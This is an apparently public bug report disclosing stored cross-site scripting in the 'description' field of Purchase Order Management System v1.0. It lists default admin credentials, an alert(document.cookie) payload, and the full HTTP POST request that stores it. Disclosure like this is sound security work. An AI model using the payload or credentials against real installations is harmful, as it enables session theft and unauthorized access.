# Purchase Order Management System v1.0 has stored cross-site scripting

BUG_Author: biantaibao

Website source address:https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html

Vulnerability url:/purchase_order/classes/Master.php?f=save_item

POST form-data parameter name="description" exists stored cross-site scripting

#### Steps to reproduce

1.Go to the admin Login

http://localhost/purchase_order/admin/login.php

Default Admin Access Information    Username: admin / Password: admin123

2.Click on "Item List" and Click on "+ Create New"

3.Put Payload into the name="description" parameter

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/biantaibao/bug_report/blob/main/xss1.png)

4.Click on Save

Transmission packet

```
POST /purchase_order/classes/Master.php?f=save_item HTTP/1.1
Host: localhost
Content-Length: 456
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEVgmE4IS3SY3HsV8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/purchase_order/admin/?page=items
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=i6hni6v878818jfsm3ur8n792s
Connection: close

------WebKitFormBoundaryEVgmE4IS3SY3HsV8
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryEVgmE4IS3SY3HsV8
Content-Disposition: form-data; name="name"

1
------WebKitFormBoundaryEVgmE4IS3SY3HsV8
Content-Disposition: form-data; name="description"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryEVgmE4IS3SY3HsV8
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryEVgmE4IS3SY3HsV8--
```

5.Payload will trigger when a user visits on http://localhost/purchase_order/admin/?page=items

![image](https://github.com/biantaibao/bug_report/blob/main/xss2.png)
